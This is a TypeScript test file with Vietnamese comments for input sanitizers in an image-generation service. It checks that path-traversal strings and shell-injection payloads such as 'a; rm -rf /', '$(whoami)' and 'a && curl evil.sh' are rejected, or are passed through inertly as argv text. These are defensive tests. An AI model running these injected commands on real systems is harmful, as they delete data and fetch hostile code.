import { test, describe } from "node:test";
import assert from "node:assert/strict";

import {
  artifactKey,
  sanitizeFilename,
  sanitizeFreeText,
  sanitizeIdentifier,
} from "../src/sanitize.ts";
import { ImagegenError } from "../src/errors.ts";

describe("sanitizeIdentifier", () => {
  test("nhận định danh hợp lệ và chuẩn hoá về chữ thường", () => {
    assert.equal(sanitizeIdentifier("tinyorbit-cloud", "project"), "tinyorbit-cloud");
    assert.equal(sanitizeIdentifier("Hero_VPS-1", "asset_id"), "hero_vps-1");
    assert.equal(sanitizeIdentifier("  padded  ", "project"), "padded");
  });

  test("chặn path traversal dưới mọi dạng đã biết", () => {
    for (const bad of [
      "..",
      "../etc",
      "a/../b",
      "....//",
      "/absolute",
      "a/b",
      "a\\b",
      ".hidden",
      "trailing.",
    ]) {
      assert.throws(
        () => sanitizeIdentifier(bad, "project"),
        (e: unknown) => e instanceof ImagegenError && e.code === "INVALID_PROJECT",
        `phải từ chối: ${bad}`,
      );
    }
  });

  test("chặn payload tiêm lệnh shell", () => {
    for (const bad of [
      "a; rm -rf /",
      "$(whoami)",
      "`id`",
      "a && curl evil.sh",
      "a|b",
      "a>b",
      "a\nb",
      "a\u0000b",
    ]) {
      assert.throws(
        () => sanitizeIdentifier(bad, "asset_id"),
        (e: unknown) => e instanceof ImagegenError && e.code === "INVALID_ASSET_ID",
        `phải từ chối: ${bad}`,
      );
    }
  });

  test("chặn chuỗi rỗng và quá dài", () => {
    assert.throws(() => sanitizeIdentifier("", "project"), ImagegenError);
    assert.throws(() => sanitizeIdentifier("a".repeat(65), "project"), ImagegenError);
    // 64 ký tự là biên trên còn hợp lệ
    assert.equal(sanitizeIdentifier("a".repeat(64), "project"), "a".repeat(64));
  });

  test("chặn giá trị không phải chuỗi", () => {
    for (const bad of [undefined, null, 42, {}, []]) {
      assert.throws(() => sanitizeIdentifier(bad, "project"), ImagegenError);
    }
  });
});

describe("sanitizeFilename", () => {
  test("bỏ trống thì dùng tên dự phòng kèm đúng đuôi", () => {
    assert.equal(sanitizeFilename(undefined, "webp", "artifact"), "artifact.webp");
    assert.equal(sanitizeFilename("", "png", "artifact"), "artifact.png");
  });

  test("luôn ép đuôi theo format, không tin đuôi người dùng gửi", () => {
    // Đây là chốt chặn quan trọng: người dùng gửi ".sh" cũng thành ".webp".
    assert.equal(sanitizeFilename("hero.sh", "webp", "artifact"), "hero.webp");
    assert.equal(sanitizeFilename("hero.png", "webp", "artifact"), "hero.webp");
  });

  test("chỉ lấy basename nên không thoát ra khỏi thư mục job", () => {
    assert.equal(sanitizeFilename("/etc/passwd", "png", "artifact"), "passwd.png");
    assert.equal(sanitizeFilename("a/b/c", "png", "artifact"), "c.png");
  });

  test("từ chối basename còn ký tự lạ sau khi cắt", () => {
    assert.throws(() => sanitizeFilename("../..", "png", "artifact"), ImagegenError);
    assert.throws(() => sanitizeFilename("a b", "png", "artifact"), ImagegenError);
    assert.throws(() => sanitizeFilename("$(id)", "png", "artifact"), ImagegenError);
  });
});

describe("sanitizeFreeText", () => {
  test("giữ nguyên tiếng Việt có dấu", () => {
    const s = "Máy chủ VPS ba chiều, màu xanh đậm";
    assert.equal(sanitizeFreeText(s, "description"), s);
  });

  test("bỏ ký tự điều khiển kể cả NUL", () => {
    assert.equal(sanitizeFreeText("a\u0000b\u0007c", "description"), "a b c");
  });

  test("từ chối rỗng và vượt giới hạn độ dài", () => {
    assert.throws(() => sanitizeFreeText("   ", "description"), ImagegenError);
    assert.throws(() => sanitizeFreeText("a".repeat(4001), "description"), ImagegenError);
  });

  test("KHÔNG lọc ký tự shell — an toàn lệnh do argv lo, không phải hàm này", () => {
    // Ghi lại chủ đích: chuỗi này hợp lệ vì nó chỉ là mô tả, và nó được
    // truyền cho Codex như một phần tử argv nên không bao giờ bị diễn
    // giải thành cú pháp.
    assert.equal(sanitizeFreeText("a; rm -rf /", "description"), "a; rm -rf /");
  });
});

describe("artifactKey", () => {
  test("dựng đúng bố cục thư mục theo spec §22", () => {
    assert.equal(
      artifactKey("tinyorbit-cloud", "hero-vps-server", 2, "artifact.webp"),
      "projects/tinyorbit-cloud/hero-vps-server/v2/artifact.webp",
    );
  });

  test("từ chối version không hợp lệ", () => {
    assert.throws(() => artifactKey("p", "a", 0, "f.webp"), ImagegenError);
    assert.throws(() => artifactKey("p", "a", -1, "f.webp"), ImagegenError);
    assert.throws(() => artifactKey("p", "a", 1.5, "f.webp"), ImagegenError);
  });
});
